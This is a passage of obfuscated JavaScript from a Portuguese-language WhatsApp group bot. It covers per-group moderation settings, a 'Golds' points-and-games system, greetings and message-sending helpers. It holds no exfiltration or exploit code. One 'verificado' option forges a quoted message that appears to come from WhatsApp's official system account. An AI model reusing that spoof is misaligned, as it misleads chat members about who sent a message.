              var _0x141936 = setting.prefix;
            }
          } else {
            if (!_0x89cd51 || _0x89cd51 && !_0x484e11) {
              var _0x141936 = setting.prefix;
            }
          }
          var _0x1d6d9e = _0x3ac611.trim().startsWith(_0x141936);
          let _0x267d4b = _0x1d6d9e ? _0x5725b4.trim().slice(1).trim().split(" ")[0].trim().toLocaleLowerCase() : null;
          const _0xcdaa0a = _0x5725b4.trim().split(/ +/).slice(1).join(" ");
          const _0x11e99e = _0x23d865.join(" ");
          var _0x3a0a2c = _0x4c3ee0 === "conversation" ? _0xd2050d.message?.["conversation"] : _0x4c3ee0 === "extendedTextMessage" ? _0xd2050d.message?.["extendedTextMessage"]?.["text"] : '';
          var _0x55aee2 = _0x3a0a2c.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
          var _0x4e6fd9 = _0x523298.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, '');
          async function _0x404795(_0x2f13aa) {
            let _0x43f09f;
            if (groupMetadata_RG.some(_0x190a1b => _0x190a1b.id === _0x2f13aa)) {
              _0x43f09f = groupMetadata_RG.find(_0x23f533 => _0x23f533.id === _0x2f13aa);
            } else {
              try {
                _0x43f09f = await _0x5196be.groupMetadata(_0x2f13aa);
                groupMetadata_RG.push(_0x43f09f);
              } catch {
                try {
                  _0x43f09f = await _0x5196be.groupMetadata(_0x2f13aa);
                  groupMetadata_RG.push(_0x43f09f);
                } catch {
                  return groupMetadata_RG.find(_0xdaccb0 => _0xdaccb0.id === _0x2f13aa);
                }
              }
            }
            return _0x43f09f;
          }
          async function _0xecbaad() {
            for (let _0x3e3de8 = 0; _0x3e3de8 < 3; _0x3e3de8++) {
              try {
                if (!Array.isArray(groupMetadata_RG)) {
                  throw new Error("groupMetadata_RG não é um array");
                }
                let _0x3098be = groupMetadata_RG.find(_0x5332e5 => _0x5332e5.id === _0x346d97);
                if (!_0x3098be) {
                  _0x3098be = await _0x404795(_0x346d97);
                }
                if (_0x3098be) {
                  return _0x3098be;
                }
              } catch (_0x508ce9) {
                console.error("Tentativa " + (_0x3e3de8 + 1) + " falhou: " + _0x508ce9.message);
              }
            }
            throw new TypeError("groupMetadata_RG.find não é uma função após 3 tentativas");
          }
          let _0x3071b5 = _0x89cd51 ? await _0xecbaad() : '';
          const _0x45b1c6 = _0x246d48.split('@')[0];
          const _0x46e43b = _0x4e6fd9.slice(0).trim().split(/ +/).shift().toLowerCase();
          const _0x517366 = _0x5196be.user.id.split(':')[0] + "@s.whatsapp.net";
          const _0x366b8b = _0x3ac611.split(/ +/g);
          const _0xe07169 = _0x3ac611;
          const _0x14080f = _0x3ac611;
          const _0x3baffe = _0x89cd51 ? _0x3071b5.subject || '' : '';
          const _0x288e09 = _0x89cd51 ? _0x3071b5.desc || '' : '';
          groupMembers = _0x89cd51 ? _0x3071b5?.["participants"] || '' : '';
          const _0x1c25a7 = _0x89cd51 ? getGroupAdmins(groupMembers) : [];
          const _0x546a1f = _0x89cd51 ? getMembros(groupMembers) : [];
          const {
            mensagens: _0x44ca11
          } = require("./armor/js/aleatoria.js");
          const {
            sortear: _0x30e708
          } = require("./armor/js/aleatoria.js");
          var _0x12ee2c = _0x44ca11[Math.floor(Math.random() * _0x44ca11.length)];
          const _0x25975c = "./DADOS/grupos/" + _0x346d97 + ".json";
          const _0x2a193a = {
            acertos: 0x0,
            erros: 0x0,
            palavra: [],
            escreveu: [],
            palavra_ofc: 0x0,
            dica: 0x0,
            tema: 0x0
          };
          const _0x4dc24e = {
            active: false,
            palavras: []
          };
          const _0x3b856d = {
            active: false,
            quantidade: null
          };
          const _0x14b0c3 = {
            bemvindo1: false,
            legendabv: "*Olá #numerodele# Bem-vindo(a) Ao #nomedogp#*\n\n*Regras:*\n#descrição#",
            fundo1: "https://xatimg.com/image/hgpecsf54VFE.jpg",
            fundo2: "https://xatimg.com/image/hgpecsf54VFE.jpg",
            legendasaiu: 0x0
          };
          const _0x21a3eb = {
            bemvindo2: false,
            legendabv: "*Olá #numerodele# Bem-vindo(a) Ao #nomedogp#*\n\n*Regras:*\n#descrição#",
            legendasaiu: 0x0
          };
          const _0x3463da = {
            name: _0x3baffe,
            groupId: _0x346d97,
            x9: false,
            antiimg: false,
            antivideo: false,
            antiaudio: false,
            antisticker: false,
            antidoc: false,
            antictt: false,
            antiloc: false,
            antilinkgp: false,
            antilinkhard: false,
            antilinkhard2: false,
            antifake: false,
            Odelete: false,
            antispam: false,
            antinotas: false,
            anticatalogo: false,
            sistemGold: false,
            visuUnica: false,
            registrarFIGUS: false,
            soadm: false,
            rg_aluguel: false,
            antimarc: false,
            msgautoban: true,
            adivinheemoji: false,
            advtlink: [],
            listanegra: [],
            advertir: [],
            prefixos: ['!'],
            advertir2: [],
            legenda_estrangeiro: '0',
            legenda_documento: '0',
            legenda_video: '0',
            legenda_imagem: '0',
            multiprefix: false,
            forca_ofc: [_0x2a193a],
            Chances: [],
            ausentes: [],
            forca_inc: false,
            comandos_gold: [],
            antipalavrao: _0x4dc24e,
            limitec: _0x3b856d,
            wellcome: [_0x14b0c3, _0x21a3eb],
            simi1: false,
            simi2: false,
            level: false,
            autosticker: false,
            autoresposta: false,
            jogos: false,
            bangp: false,
            nsfw: false
          };
          const _0x5db9dc = [_0x3463da];
          if (_0x89cd51 && !fs.existsSync(_0x25975c)) {
            fs.writeFileSync(_0x25975c, JSON.stringify(_0x5db9dc, null, 2) + "\n");
          }
          try {
            var _0x326cbd = _0x89cd51 ? JSON.parse(fs.readFileSync(_0x25975c)) : undefined;
          } catch (_0x4a82e6) {
            fs.writeFileSync(_0x25975c, JSON.stringify(_0x5db9dc));
          }
          function _0x137e44(_0x5541df) {
            fs.writeFileSync(_0x25975c, JSON.stringify(_0x5541df, null, 2) + "\n");
          }
          function _0x13c255(_0x410919) {
            fs.writeFileSync("./DADOS/nescessario.json", JSON.stringify(_0x410919, null, 2));
          }
          function _0x1564b4(_0x42fb59) {
            fs.writeFileSync("./DADOS/grupos/golds.json", JSON.stringify(_0x42fb59, null, 2) + "\n");
          }
          const _0x3befc0 = rggold.findIndex(_0x521de0 => _0x521de0.grupo === _0x346d97);
          const _0x52c696 = rggold[_0x3befc0]?.["usus"]?.["findIndex"](_0x56496d => _0x56496d.id === _0x246d48);
          const _0x3de59a = {
            'RS_C': function (_0xd38ea, _0x38fbec, _0x5c6945) {
              return _0x326cbd[0].Chances.find(_0x2fd61c => _0x2fd61c.id === _0xd38ea)[_0x38fbec] || _0x5c6945 || null;
            },
            'RS': function (_0x1bd351, _0x22b7e8) {
              return rggold[_0x3befc0].usus.find(_0x54c8a4 => _0x54c8a4.id === _0x1bd351)[_0x22b7e8] || null;
            },
            'ADD_C': function (_0x4cd505, _0x3e97bd, _0x2ea3db) {
              _0x326cbd[0].Chances.find(_0xa9949 => _0xa9949.id === _0x4cd505)[_0x3e97bd] = _0x2ea3db;
              _0x137e44(_0x326cbd);
            },
            'ADD_C_M': function (_0x42419b, _0x327d56, _0x31db45) {
              _0x326cbd[0].Chances.find(_0x31eb2e => _0x31eb2e.id === _0x42419b)[_0x327d56] += _0x31db45;
              _0x137e44(_0x326cbd);
            },
            'ADD_C_P': function (_0x1083a5, _0x535acc, _0x4897fe) {
              _0x326cbd[0].Chances.find(_0x5ea2f9 => _0x5ea2f9.id === _0x1083a5)[_0x535acc].push(_0x4897fe);
              _0x137e44(_0x326cbd);
            },
            'ADD': async function (_0x529840, _0x52cffb) {
              DM_ = rggold[_0x3befc0].usus.find(_0x1e099a => _0x1e099a.id === _0x529840);
              if (!DM_) {
                return _0x50740b("Este usuário nunca mandou mensagem enquanto eu estava ativo, então ele não está registrado no meu sistema de Golds.");
              }
              if (!DM_.Golds) {
                DM_.Golds = _0x52cffb;
              } else {
                DM_.Golds += _0x52cffb;
              }
              _0x1564b4(rggold);
            },
            'ADD_2': async function (_0x246d8b, _0x5d52f5, _0x2cf5c5, _0x3fb310) {
              DM_ = rggold[_0x3befc0].usus.find(_0x57544f => _0x57544f.id === _0x246d8b);
              if (!DM_) {
                return _0x50740b("Este usuário nunca mandou mensagem enquanto eu estava ativo, então ele não está registrado no meu sistema de Golds.");
              }
              DM_.Golds += _0x5d52f5;
              DM_[_0x2cf5c5] = _0x3fb310;
              _0x1564b4(rggold);
            },
            'RM': async function (_0x1180e9, _0x4016e9) {
              DM_ = rggold[_0x3befc0].usus.find(_0x3297dd => _0x3297dd.id === _0x1180e9);
              if ((DM_?.["Golds"] || 0) < _0x4016e9) {
                return _0x50740b("A quantidade que tem é inferior a que você deseja tirar.");
              }
              DM_.Golds -= _0x4016e9;
              _0x1564b4(rggold);
            },
            'R_A': async function (_0x113566, _0x3ccab3, _0x8f5d3e) {
              DM_ = rggold[_0x3befc0].usus.find(_0x542fb5 => _0x542fb5.id === _0x113566);
              DM_2 = rggold[_0x3befc0].usus.find(_0x5e2280 => _0x5e2280.id === _0x3ccab3);
              if ((DM_?.["Golds"] || 0) < _0x8f5d3e) {
                return _0x5dcc57("A quantidade que tem é inferior a que você deseja tirar, do usuário ( @" + _0x113566.split('@')[0] + " )");
              }
              if (!DM_2) {
                return _0x5dcc57("Este usuário ( @" + _0x3ccab3.split('@')[0] + " ) nunca mandou mensagem enquanto eu estava ativo, então ele não está registrado no meu sistema de Golds.");
              }
              DM_.Golds -= _0x8f5d3e;
              DM_2.Golds += _0x8f5d3e;
              _0x1564b4(rggold);
            },
            'A_R_2': async function (_0x5037e1, _0x59c718, _0x588985, _0xdb0dbd) {
              DM_ = rggold[_0x3befc0].usus.find(_0x58bffb => _0x58bffb.id === _0x5037e1);
              DM_2 = rggold[_0x3befc0].usus.find(_0x91f94c => _0x91f94c.id === _0x59c718);
              if ((DM_?.["Golds"] || 0) < _0x588985) {
                return _0x5dcc57("A quantidade que tem é inferior a que você deseja tirar, do usuário ( @" + _0x5037e1.split('@')[0] + " )");
              }
              if (!DM_2) {
                return _0x5dcc57("Este usuário ( @" + _0x59c718.split('@')[0] + " ) nunca mandou mensagem enquanto eu estava ativo, então ele não está registrado no meu sistema de Golds.");
              }
              DM_.Golds += _0x588985;
              DM_2.Golds -= _0xdb0dbd || _0x588985;
              _0x1564b4(rggold);
            }
          };
          async function _0xed07d5(_0x31de8f, _0x2dc980) {
            if (!_0x31de8f) {
              return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
            }
            _0x5196be.sendMessage(_0x346d97, {
              'text': "Olá @" + _0x2dc980.split('@')[0] + " você contém " + _0x3de59a.RS(_0x2dc980, "Golds") + " Golds, breve você será bem mais rico que Elon Musk, só confia..",
              'mentions': [_0x2dc980]
            });
          }
          async function _0x54f0dc(_0xa1b423, _0x4e4592, _0x568ab9) {
            if (!_0xa1b423) {
              return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
            }
            _0x3de59a.ADD(_0x568ab9, _0x4e4592);
            _0x5196be.sendMessage(_0x346d97, {
              'text': "Parabéns: > @" + _0x568ab9.split('@')[0] + " você ganhou " + _0x4e4592 + " Golds.. ",
              'mentions': [_0x568ab9]
            });
          }
          async function _0x727d62(_0x2fd6a8, _0x2ee6db, _0x5f003e) {
            if (!_0x2fd6a8) {
              return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
            }
            _0x3de59a.RM(_0x5f003e, _0x2ee6db);
            _0x5196be.sendMessage(_0x346d97, {
              'text': "Que pena... @" + _0x5f003e.split('@')[0] + " você perdeu " + _0x2ee6db + " Golds.. ",
              'mentions': [_0x5f003e]
            });
          }
          function _0x51f1a3(_0x1f0822) {
            let _0x5a5d44 = 0;
            for (let _0x5d06aa = _0x1f0822.length; _0x5a5d44 < _0x5d06aa; _0x5a5d44++) {
              if (_0x1f0822.charCodeAt(_0x5a5d44) > 255) {
                return true;
              }
            }
            return false;
          }
          const _0x5f5cbb = _0xd2050d.key.id.length > 21 ? "Android ツ" : _0xd2050d.key.id.substring(0, 2) == '3A' ? "IPhone ｯ" : "WhatsApp web シ";
          let _0x3cc23a = setting.numerodono + "@s.whatsapp.net";
          const _0x405e7d = _0x3cc23a.includes(_0x246d48);
          const _0x33286a = premium.includes(_0x246d48) || _0xf59944;
          const _0x42a9f2 = _0x1c25a7.includes(_0x517366) || false;
          const _0x3f2f63 = _0x1c25a7.includes(_0x246d48) || _0xf59944;
          const _0x4b84b4 = ban.includes(_0x246d48);
          const _0x2068a9 = nescessario.visualizarmsg;
          const _0x2ba8b9 = nescessario.verificado;
          const _0x5545fb = nescessario.menu_audio;
          const _0x675276 = nescessario.antipv2;
          const _0x42316a = nescessario.botoes;
          const _0x36e704 = nescessario.antipv3;
          const _0x4a11c3 = nescessario.consoleoff;
          const _0x41dc36 = nescessario.botoff;
          const _0x40c021 = nescessario.listanegraG;
          const _0x2d6efa = nescessario.antipv;
          const _0x50be44 = nescessario.anticall;
          const _0x128c02 = nescessario?.["rg_aluguelGB"] || _0x326cbd && _0x326cbd[0]?.["rg_aluguel"] || false;
          const _0x4fc20a = rg_aluguel.some(_0x31b192 => _0x31b192.id_gp === _0x346d97 && Math.floor(Date.now() / 1000) <= Math.floor(_0x31b192.vencimento));
          const _0x2ddc0a = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antiimg"] : undefined;
          const _0x14171f = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antivideo"] : undefined;
          const _0x1b617c = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antiaudio"] : undefined;
          const _0x1a72a5 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antisticker"] : undefined;
          const _0x5aaef2 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antidoc"] : undefined;
          const _0x17cef7 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antictt"] : undefined;
          const _0x2ac64a = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antiloc"] : undefined;
          const _0x83ee35 = _0x89cd51 ? _0x326cbd[0]?.["advtlink"] : undefined;
          const _0x495d57 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["msgautoban"] : undefined;
          const _0x3cafb4 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antilinkgp"] : undefined;
          const _0x53418e = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["adivinheemoji"] : undefined;
          const _0x2b140d = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antilinkhard"] : undefined;
          const _0x2e49b2 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antifake"] : undefined;
          const _0x5bea47 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["soadm"] : undefined;
          const _0xc01de = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["visuUnica"] : undefined;
          const _0x33d21e = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["sistemGold"] : undefined;
          const _0x16ba85 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antimarc"] : undefined;
          const _0x5adeef = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["multiprefix"] : undefined;
          const _0x51d731 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antinotas"] : undefined;
          const _0x52e919 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["anticatalogo"] : undefined;
          const _0x21877a = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["wellcome"][0] ? _0x326cbd[0].wellcome[0].bemvindo1 : undefined : undefined;
          const _0x25178f = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["wellcome"][1] ? _0x326cbd[0].wellcome[1].bemvindo2 : undefined : undefined;
          const _0x785cbd = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["simi1"] : undefined;
          const _0x2623e0 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["simi2"] : undefined;
          const _0x29ccfb = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["autosticker"] : undefined;
          const _0x5a94ec = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["autoresposta"] : undefined;
          const _0x5c6233 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["jogos"] : undefined;
          const _0x46517b = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["slot"] : undefined;
          const _0x40dfc7 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["level"] : undefined;
          const _0x2f3424 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["nsfw"] : undefined;
          const _0x627769 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antipalavrao"]?.["active"] : undefined;
          const _0x40d1ba = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["limitec"]?.["active"] : undefined;
          const _0x48bcb9 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.["antispam"] : undefined;
          const _0x2d5ff0 = _0x89cd51 ? _0x128c02 && !_0x4fc20a ? false : _0x326cbd[0]?.['x9'] : undefined;
          const _0x221071 = _0x89cd51 ? _0x326cbd[0].limitec.quantidade : undefined;
          var _0x285e8e = _0x89cd51 ? _0x326cbd[0].advertir : undefined;
          var _0x2b47ae = _0x89cd51 ? _0x326cbd[0].advertir2 : undefined;
          const _0x18a4bb = _0x89cd51 ? _0x326cbd[0].bangp : undefined;
          const _0x57f319 = _0x89cd51 ? _0x326cbd[0].antipalavrao.palavras : undefined;
          const _0x1b869d = nescessario.Odelete;
          const _0x3431a7 = nescessario.msgantilink;
          const _0x3b34da = {
            espere: '' + _0x12ee2c,
            successo: "️❬ ✔ ❭ Sucesso 🖤",
            levelon: "❬ ✔ ❭ *leveling* *ativado*",
            leveloff: "❬ X ❭  *leveling* *desativado*",
            levelnoton: "❬ X ❭ *leveling não ativado*",
            levelnol: "*error* 0 °-°",
            error: {},
            msg: {}
          };
          _0x3b34da.error.stick = "*falhou, tente novamente ^_^*";
          _0x3b34da.error.Iv = "Link invalido ☹️";
          _0x3b34da.msg.grupo = "[❗] Este comando só pode ser usado em grupos! ❌";
          _0x3b34da.msg.premium = "[❗] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*";
          _0x3b34da.msg.mod = "[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD " + setting.NickDono + '*';
          _0x3b34da.msg.banido = "❌ Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque ❌";
          _0x3b34da.msg.donosmt = "[❗] Este é um recurso especial para o proprietário ❌";
          _0x3b34da.msg.donosmt2 = "[❗] Este é um recurso especial para o proprietário ❌";
          _0x3b34da.msg.adm = "[❗] Este comando só pode ser usado por administradores de grupo! ❌";
          _0x3b34da.msg.Badmin = " [❗] Este comando só pode ser usado quando o bot se torna administrador! ❌";
          enviar = _0x3b34da;
          var _0x50f430 = _0x12ee2c;
          var _0x24f408 = "Este comando so pode ser utilizado com o comando " + _0x141936 + "modobrincadeira 1 ativado, para desativar só basta utilizar " + _0x141936 + "modobrincadeira 0";
          let _0x212ce6;
          if (_0x2ba8b9) {
            const _0x42e19d = {
              remoteJid: "status@broadcast"
            };
            const _0x5b1520 = {
              'fromMe': false,
              'participant': "0@s.whatsapp.net",
              ...(_0x346d97 ? _0x42e19d : {})
            };
            const _0x3dd103 = {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: '' + NomeDoBot
            };
            const _0x2fc878 = {
              imageMessage: _0x3dd103
            };
            const _0x1e24fb = {
              key: _0x5b1520,
              message: _0x2fc878
            };
            _0x212ce6 = _0x1e24fb;
          } else {
            _0x212ce6 = _0xd2050d;
          }
          const _0x42d32c = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["participant"];
          const _0x43dea0 = _0x23d865?.["join"](" ")["replace"]('@', '') + "@s.whatsapp.net";
          const _0xd79836 = _0xd2050d.message?.["extendedTextMessage"]?.["contextInfo"]?.["mentionedJid"];
          const _0x1911ab = _0x11e99e.includes('@') ? _0x43dea0 : _0x246d48;
          const _0x44cf80 = _0x11e99e.length > 6 && !_0x11e99e.includes('@') ? _0x11e99e.replace(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net" : _0x42d32c;
          const _0x5e13bf = _0x11e99e.includes('@') ? _0xd79836?.["length"] > 0 ? _0xd79836[0] : false : _0x42d32c || false;
          const _0x430801 = _0x11e99e.includes('@') ? _0xd79836?.["length"] > 0 ? _0xd79836[0] : false : _0x42d32c || _0x246d48;
          const _0x3e445f = _0x11e99e.includes('@') ? _0x43dea0 : _0x11e99e.length > 6 && !_0x11e99e.includes('@') ? _0x11e99e.replace(new RegExp("[()+-/ +/]", 'gi'), '') + "@s.whatsapp.net" : _0x42d32c;
          if (_0x89cd51 && _0x1d6d9e && _0x18a4bb && !_0x3eefd0 && !_0xf59944) {
            return;
          }
          if (_0x89cd51 && _0x1d6d9e && _0x5bea47 && !_0x3eefd0 && !_0xf59944 && !_0x3f2f63) {
            return;
          }
          if (_0x41dc36 && !_0x3eefd0 && !_0xf59944) {
            return;
          }
          if (!_0x1d6d9e && _0xd2050d.key.fromMe) {
            return;
          }
          function _0x49d13a(_0x203757) {
            return linkfy.find(_0x203757)[0]?.["isLink"];
          }
          async function _0x3af65f(_0x3f789f) {
            if (linkfy.find(_0x3f789f)[0]?.["isLink"]) {
              return _0x3f789f;
            } else {
              _0x36d5cf = await yts(_0x3f789f);
              resultadoyts = _0x36d5cf.videos[0].url;
              return resultadoyts;
            }
          }
          const _0x4d15d0 = moment().tz("America/Sao_Paulo").format("HH:mm:ss");
          if (_0x4d15d0 > "00:00:00" && _0x4d15d0 < "05:00:00") {
            var _0x33c0c0 = "Boa madrugada";
          }
          if (_0x4d15d0 > "05:00:00" && _0x4d15d0 < "12:00:00") {
            var _0x33c0c0 = "Bom dia";
          }
          if (_0x4d15d0 > "12:00:00" && _0x4d15d0 < "18:00:00") {
            var _0x33c0c0 = "Boa tarde";
          }
          if (_0x4d15d0 > "18:00:00") {
            var _0x33c0c0 = "Boa noite";
          }
          const _0x26c240 = (_0x4530ed, _0x4ea504) => {
            const _0x39e58b = {
              text: _0x4ea504
            };
            _0x5196be.sendMessage(_0x4530ed, _0x39e58b);
          };
          const _0x1106fd = (_0x3c2dc2, _0x608a88, _0x5635b0) => {
            if (_0x5635b0 == null || _0x5635b0 == undefined || _0x5635b0 == false) {
              _0x5196be.sendMessage(_0x346d97, {
                'text': _0x3c2dc2.trim(),
                'mentions': _0x608a88
              });
            } else {
              _0x5196be.sendMessage(_0x346d97, {
                'text': _0x3c2dc2.trim(),
                'mentions': _0x608a88
              });
            }
          };
          const _0x5dcc57 = (_0x2f5241 = '', _0x424131 = _0xd2050d) => {
            memberr = [];
            vy = _0x2f5241.includes("\n") ? _0x2f5241.split("\n") : [_0x2f5241];
            for (vz of vy) {
              for (zn of vz.split(" ")) {
                if (zn.includes('@')) {
                  memberr.push(parseInt(zn.split('@')[1]) + "@s.whatsapp.net");
                }
              }
            }
            const _0x584ed5 = {
              quoted: _0x424131
            };
            _0x5196be.sendMessage(_0x346d97, {
              'text': _0x2f5241.trim(),
              'mentions': memberr
            }, _0x584ed5);
          };
          const _0x3f309c = (_0x34bd3a = '') => {
            memberr = [];
            vy = _0x34bd3a.includes("\n") ? _0x34bd3a.split("\n") : [_0x34bd3a];
            for (vz of vy) {
              for (zn of vz.split(" ")) {
                if (zn.includes('@')) {
                  memberr.push(parseInt(zn.split('@')[1]) + "@s.whatsapp.net");
                }
              }
            }
            _0x5196be.sendMessage(_0x346d97, {
              'text': _0x34bd3a.trim(),
              'mentions': memberr
            });
          };
          const _0x3b76ab = (_0x832d76 = '', _0x378bad, _0x236b25) => {
            memberr = [];
            vy = _0x832d76.includes("\n") ? _0x832d76.split("\n") : [_0x832d76];
            for (vz of vy) {
              for (zn of vz.split(" ")) {
                if (zn.includes('@')) {
                  memberr.push(parseInt(zn.split('@')[1]) + "@s.whatsapp.net");
                }
              }
            }
            const _0x879886 = {
              url: _0x378bad
            };
            const _0x344e62 = {
              quoted: _0x236b25
            };
            _0x5196be.sendMessage(_0x346d97, {
              'image': _0x879886,
              'caption': _0x832d76.trim(),
              'mentions': memberr
            }, _0x344e62);
          };
          if (_0x33d21e && _0x89cd51 && _0x42a9f2 && _0x484e11 && !_0xd2050d.key.fromMe) {
            async function _0xd8d927() {
              if (!_0x326cbd[0]?.["Chances"]?.["some"](_0x5885ce => _0x5885ce.id === _0x246d48)) {
                const _0x17b409 = {
                  id: _0x246d48,
                  ChanceG: null,
                  ChanceR: [],
                  Vinganca: null
                };
                if (!_0x326cbd[0].hasOwnProperty("Chances")) {
                  _0x326cbd[0].Chances = [];
                } else {
                  _0x326cbd[0].Chances.push(_0x17b409);
                }
                _0x137e44(_0x326cbd);
              }
              if (!rggold.some(_0x324043 => _0x324043.grupo === _0x346d97)) {
                const _0x322507 = {
                  id: _0x246d48,
                  Golds: 0x0,
                  data: 0x0,
                  emp_G: [],
                  emp_A: []
                };
                const _0x5b9edc = {
                  grupo: _0x346d97,
                  usus: [_0x322507]
                };
                rggold.push(_0x5b9edc);
                _0x1564b4(rggold);
              } else {
                if (rggold.some(_0x4c9d78 => _0x4c9d78.grupo === _0x346d97) && !rggold[_0x3befc0]?.["usus"]?.["some"](_0x115f39 => _0x115f39?.['id'] === _0x246d48)) {
                  const _0x56c1f0 = {
                    id: _0x246d48,
                    Golds: 0x0,
                    data: 0x0,
                    emp_G: [],
                    emp_A: []
                  };
                  rggold[_0x3befc0].usus.push(_0x56c1f0);
                  _0x1564b4(rggold);
                }
              }
              var _0x16dd13 = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              if (_0x3ac611.trim() && !_0xd2050d.message?.["reactionMessage"]?.["text"] && _0x16dd13 != _0x3de59a.RS(_0x246d48, "data")) {
                var _0x61f33f = _0x326cbd[0].Chances.find(_0x27afd3 => _0x27afd3.id === _0x246d48);
                _0x5196be.sendMessage(_0x346d97, {
                  'text': lermais + (_0x33c0c0 + " -> Olá @" + _0x45b1c6 + "! Você recebeu 20 Golds pela primeira mensagem do dia. Além disso, diversas chances para se entreter no grupo, use o comando " + _0x141936 + "menugold. Boa sorte e divirta-se! 🌟🪙"),
                  'mentions': [_0x246d48]
                });
                _0x3de59a.ADD_2(_0x246d48, 20, "data", _0x16dd13);
                const _0x22fb9c = {
                  errou: 0x0,
                  acertou: 0x0,
                  numero: 0x0
                };
                const _0x1467bf = {
                  quiz: [_0x22fb9c],
                  cara_coroa: 0x0,
                  aviator: 0x0,
                  doubleg: 0x0,
                  cachaca: 0x3,
                  ChanceAp: 0x0,
                  cachacacnt: 0x0,
                  ChanceG: null,
                  ChanceR: [],
                  Vinganca: null,
                  roletadasorte: false,
                  cassino: 0x0
                };
                Object.assign(_0x61f33f, _0x1467bf);
                _0x137e44(_0x326cbd);
              }
            }
            _0xd8d927();
          }
          const _0x484933 = async (_0x29cf8d, _0x5e9480) => {
            const _0x88ecbc = {
              text: _0x5e9480,
              key: _0xd2050d.key
            };
            const _0x3688a0 = {
              react: _0x88ecbc
            };
            _0x5196be.sendMessage(_0x29cf8d, _0x3688a0);
          };
          var _0x42c008 = async (_0x44623b, _0x5d3bb8, _0xa56de0, _0x395ff2, _0x512da8, _0x260d13, _0x75fced) => {
            sections = _0x260d13;
            const _0x557620 = {
              text: _0x5d3bb8,
              footer: _0xa56de0,
              title: _0x395ff2,
              buttonText: _0x512da8,
              viewOnceMessageV2: true,
              sections: sections
            };
            const _0x557e00 = {
              quoted: _0x75fced
            };
            _0x5196be.sendMessage(_0x44623b, _0x557620, _0x557e00);
          };
          var _0x3941ea = async (_0x1e6c96, _0x45a593, _0x5ef7b7) => {
            const _0x443367 = {
              url: _0x45a593
            };
            const _0xcc5b88 = {
              video: _0x443367,
              caption: _0x5ef7b7
            };
            const _0x2188be = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x1e6c96, _0xcc5b88, _0x2188be)["catch"](_0x48c0a8 => {
              return console.log(_0x48c0a8);
            });
          };
          var _0x3c2c3a = async (_0x5f143a, _0x1a52b5, _0x5b1d20) => {
            const _0x54a918 = {
              url: _0x1a52b5
            };
            const _0x502325 = {
              image: _0x54a918,
              caption: _0x5b1d20
            };
            const _0x538294 = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x5f143a, _0x502325, _0x538294)["catch"](_0x20c729 => {
              return console.log(_0x20c729);
            });
          };
          var _0x68b0d0 = async (_0x18f340, _0x56679c, _0x2e3193) => {
            const _0x7641b = {
              url: _0x56679c
            };
            const _0x5c9f95 = {
              image: _0x7641b,
              caption: _0x2e3193
            };
            const _0x5ac793 = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x18f340, _0x5c9f95, _0x5ac793);
          };
